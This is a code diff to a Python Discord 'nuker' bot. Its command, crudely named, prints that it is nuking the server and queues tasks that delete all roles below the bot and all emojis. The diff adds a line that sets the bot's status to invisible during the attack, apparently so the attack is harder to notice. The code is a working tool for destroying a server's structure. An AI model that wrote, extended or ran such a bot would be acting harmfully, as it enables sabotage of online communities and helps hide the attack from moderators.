@@ -14,8 +14,9 @@ bot.remove_command('help')
 
 @bot.command()
 async def fuck(ctx):
-    print(f"{Fore.LIGHTGREEN_EX}Nuking {ctx.guild.name}")
+    print(f"{Fore.LIGHTGREEN_EX}Nuking {ctx.guild.name} and turning status to Invisible")
     time.sleep(1)
+    await bot.change_presence(status=discord.Status.invisible)
     tasks = [
         Nuke.roles(ctx),  # deletes all roles below the bot
         Nuke.emojis(ctx),  # deletes all emojis
